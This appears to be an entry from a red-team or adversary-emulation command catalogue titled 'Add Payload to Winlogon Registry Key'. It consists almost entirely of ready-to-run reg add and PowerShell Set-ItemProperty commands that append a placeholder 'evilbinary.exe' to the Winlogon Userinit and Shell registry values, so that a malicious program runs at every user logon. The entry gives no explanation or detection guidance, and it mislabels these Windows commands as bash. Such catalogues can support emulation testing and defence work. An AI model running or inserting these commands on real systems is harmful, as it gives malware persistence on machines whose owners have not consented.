---
id: c7ab1b64-038f-49fa-884c-e6d78a95af14
name: Add Payload to Winlogon Registry Key
type: command
executor: bash
data: 'reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit
  /d "Userinit.exe, evilbinary.exe" /f

  reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /d
  "explorer.exe, evilbinary.exe" /f

  Set-ItemProperty "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"
  "Userinit" "Userinit.exe, evilbinary.exe" -Force

  Set-ItemProperty "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"
  "Shell" "explorer.exe, evilbinary.exe" -Force'
output: null
created_at: '2023-04-06T03:56:28.015427+00:00'
updated_at: '2023-04-10T20:37:21.623497+00:00'
---

# Add Payload to Winlogon Registry Key

```bash
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /d "Userinit.exe, evilbinary.exe" /f
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /d "explorer.exe, evilbinary.exe" /f
Set-ItemProperty "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Userinit" "Userinit.exe, evilbinary.exe" -Force
Set-ItemProperty "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Shell" "explorer.exe, evilbinary.exe" -Force
```
